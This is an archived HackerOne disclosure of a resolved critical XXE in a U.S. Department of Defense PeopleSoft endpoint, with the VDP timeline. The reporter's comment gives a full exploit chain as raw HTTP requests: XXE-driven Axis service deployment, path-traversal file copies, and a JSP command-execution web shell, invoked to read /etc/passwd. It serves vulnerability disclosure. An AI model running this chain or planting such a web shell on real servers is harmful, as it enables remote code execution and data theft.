---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/xml-external-entities-xxe
  - env/web
substate: "resolved"
weakness: "XML External Entities (XXE)"
enriched: true
body: true
date: 2019-10-04
submitted: 2017-05-12T10:41:43.936Z
bounty_usd: null
votes: 97
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "jin"
source: "https://hackerone.com/reports/227880"
title: "XXE in DoD website that may lead to RCE"
---
# XXE in DoD website that may lead to RCE

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 97 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2019-10-04

- Report: [https://hackerone.com/reports/227880](https://hackerone.com/reports/227880)
- CWE: XML External Entities (XXE)
- Submitted: 2017-05-12T10:41:43.936Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:**
XXE in https://█████

**Description:**
A malicious user can modify an XML-based request to include XML content that is then parsed locally.

## Impact
An attacker can use an XML external entity vulnerability to send specially crafted unauthorized XML requests, which will be processed by the XML parser. The attacker can use an XML external entity vulnerability for getting unauthorised access to the OS file system.

## PoC

```
POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
Host: https://███
Content-type: text/xml
Content-Length: 50

<!DOCTYPE a PUBLIC "-//B/A/EN" "HELLO_XXE"><a></a>
```

## Timeline

- **Report Filed**
- **2017-05-12** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Severity Updated**
- **Report Triaged**
- **2017-05-25** @jin: Guys, just got a RCE via this XXE. Coz the base is this XXE, im not gonna create a new report. Just **update title and severity** pls.

PoC in attachments.

Stepts to reproduce:
1.  Install new service via localhost using XXE

	```http
	POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
	Host: █████
	Content-Type: application/xml
	Content-Length: 612

	<!DOCTYPE a PUBLIC "-//B/A/EN" "http://localhost:8080/pspc/services/AdminService?method=%21--%3E%3Cns1%3Adeployment+xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22+xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22+xmlns%3Ans1%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%3E%3Cns1%3Aservice+name%3D%22lmJyaVBUrfcEfJw%22+provider%3D%22java%3ARPC%22%3E%3Cns1%3Aparameter+name%3D%22className%22+value%3D%22org.apache.pluto.portalImpl.Deploy%22%2F%3E%3Cns1%3Aparameter+name%3D%22allowedMethods%22+value%3D%22%2A%22%2F%3E%3C%2Fns1%3Aservice%3E%3C%2Fns1%3Adeployment">
	```

2. Copy xml to temp dir

	```http
	POST /pspc/services/lmJyaVBUrfcEfJw HTTP/1.1
	Host: ███
	Accept: */*
	Connection: close
	SOAPAction: useless
	Content-Type: application/xml
	Content-Length: 774

	<?xml version="1.0" encoding="utf-8"?>
			<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
			xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
			xmlns:xsd="http://www.w3.org/2001/XMLSchema"
			xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
			<soapenv:Body>
			<api:copy
			soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
				<in0 xsi:type="xsd:string">./applications/peoplesoft/pspc.war/WEB-INF/data/portletentityregistry.xml</in0>
				<in1 xsi:type="xsd:string">../../../../../../../../../../../../../../../../../../../../tmp/QAusGyxGqQqyVEhqzPbu/WEB-INF/data/portletentityregistry.xml</in1>
			</api:copy>
			</soapenv:Body>
			</soapenv:Envelope>
	```

3. Add jsp shell payload

	```http
	POST /pspc/services/lmJyaVBUrfcEfJw HTTP/1.1
	Host: ████████
	Accept: */*
	Connection: close
	SOAPAction: useless
	Content-Type: application/xml
	Content-Length: 1304

	<?xml version="1.0" encoding="utf-8"?>
			<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
			xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
			xmlns:xsd="http://www.w3.org/2001/XMLSchema"
			xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
			<soapenv:Body>
			<api:main
			soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
				<api:in0>
					<item xsi:type="xsd:string">../../../../../../../../../../../../../../../../../../../../tmp</item>
					<item xsi:type="xsd:string">QAusGyxGqQqyVEhqzPbu</item>
					<item xsi:type="xsd:string">QAusGyxGqQqyVEhqzPbu.war</item>
					<item xsi:type="xsd:string">/bin/bash</item>
					<item xsi:type="xsd:string">-addToEntityReg</item>
					<item xsi:type="xsd:string"><![CDATA[<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("c") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("c")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }; p.destroy(); }%>]]></item>
				</api:in0>
			</api:main>
			</soapenv:Body>
			</soapenv:Envelope>
	```
	
4. Copy XML to JSP in webroot

	```http
	POST /pspc/services/lmJyaVBUrfcEfJw HTTP/1.1
	Host: █████
	Accept: */*
	Connection: close
	SOAPAction: useless
	Content-Type: application/xml
	Content-Length: 761

	<?xml version="1.0" encoding="utf-8"?>
			<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
			xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
			xmlns:xsd="http://www.w3.org/2001/XMLSchema"
			xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
			<soapenv:Body>
			<api:copy
			soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
				<in0 xsi:type="xsd:string">../../../../../../../../../../../../../../../../../../../../tmp/QAusGyxGqQqyVEhqzPbu/WEB-INF/data/portletentityregistry.xml</in0>
				<in1 xsi:type="xsd:string">./applications/peoplesoft/PSIGW.war/PVrIiSDNAQlOQubhYHDE.jsp</in1>
			</api:copy>
			</soapenv:Body>
			</soapenv:Envelope>
	```
	
5. Go to your JSP shell with browser and get fully working RCE
https://██████/PSIGW/PVrIiSDNAQlOQubhYHDE.jsp?c=cat%20/etc/passwd
- **Report Severity Updated**
- **2017-05-26** @jland: @jin: thanks for the additional details and PoC. I've elevated the severity to reflect the new information.
- **2017-07-03** @gwassermann: Greetings,

We have been advised that the vulnerability you reported has been resolved. Before we close this report, we would appreciate it if you could confirm that the vulnerability no longer exists.

If we do not receive a response within two weeks, we will send you a second request. If we do not receive a response from you within two weeks of the second notice, we will close this report as resolved.

If you do not believe this vulnerability has been effectively resolved or if you have any questions, please let us know.

Thank you for your time and effort to improve the security of the DoD information network.

Regards,

The VDP Team
- **2017-07-03** @amanion: This may not be a correct before/after comparison, can someone with Burp reproduce the initial report?

```
$ cat foo
<!DOCTYPE a PUBLIC "-//B/A/EN" "HELLO_XXE"><a></a>

$ curl -k -X POST -d @foo https://█████/PSIGW/PeopleSoftServiceListeningConnector 
<?xml version="1.0" ?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"><SOAP-ENV:Body><SOAP-ENV:Fault><faultcode>SOAP-ENV:Client</faultcode><faultstring>PeopleSoftServiceListeningConnector: HTTPRequest : Invalid SoapRequest - Wrong SoapVersion</faultstring><detail><IBResponse type="error" xmlns=""><DefaultTitle>Integration Broker Response</DefaultTitle><StatusCode>20</StatusCode><MessageID>10501</MessageID><DefaultMessage><![CDATA[The message being processed is invalid]]></DefaultMessage></IBResponse></detail></SOAP-ENV:Fault></SOAP-ENV:Body></SOAP-ENV:Envelope>
```

Evidence that vulnerability has been fixed, but need to confirm.
- **2017-07-03** @jin: Hi, looks like its fixed now. 

Can i ask to update title to **RCE** and then disclose this?
- **Report Title Updated**
- **Report Resolved**
- **Agreed On Going Public**
- **2017-07-18** @jin: ?
- **2017-08-15** @jin: guys, can we disclose this?
- **2017-12-18** @jin: up
- **2018-09-04** @jin: "If you would like to request disclosure, you should be able to select a button on your side for disclosure. Your request will be reviewed and responded to separately.

Regards,

The VDP Team"


So, can we finally do it? xD
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
